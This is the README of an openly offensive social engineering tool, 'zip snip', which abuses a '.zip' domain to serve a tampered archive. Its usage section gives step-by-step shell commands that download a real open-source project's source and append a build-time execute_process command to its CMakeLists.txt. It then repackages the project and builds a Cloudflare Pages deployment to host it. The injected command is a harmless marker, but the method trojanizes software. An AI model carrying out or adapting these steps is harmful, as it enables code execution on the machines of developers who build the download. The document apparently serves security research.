# zip snip 🤐✂️

Social engineering attack using a `.zip` domain.

[![video](http://img.youtube.com/vi/WR4IY04FqtU/0.jpg)](http://www.youtube.com/watch?v=WR4IY04FqtU "video")

## Description

See full blog post at https://noperator.dev/posts/zip-snip/.

## Getting started

### Usage

First, prepare a malicious ZIP file. For example, the following code:
- downloads the zipped source code for a popular CLI URL parser
- extracts the project and inserts a malicious command into a build script
- zips the project back up

```
$ wget https://github.com/stricaud/faup/archive/refs/tags/v1.4.zip
$ unzip v1.4.zip
$ echo 'execute_process (COMMAND bash -c "touch /tmp/pwn")' >> faup-1.4/CMakeLists.txt
$ zip -r9 faup-1.4.zip faup-1.4
```

Next, create a Cloudflare Pages deployment (`site.zip`) that includes this malicious ZIP file.

```
$ ./build-site.sh faup-1.4.zip
```

After building a site above, nativate to Cloudflare Pages, choose (or create) your project, create a new deployment, and upload the `site.zip` file you just created.

## Back matter

### Legal disclaimer

Usage of this tool for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state, and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.

### License

This project is licensed under the [MIT License](LICENSE.md).
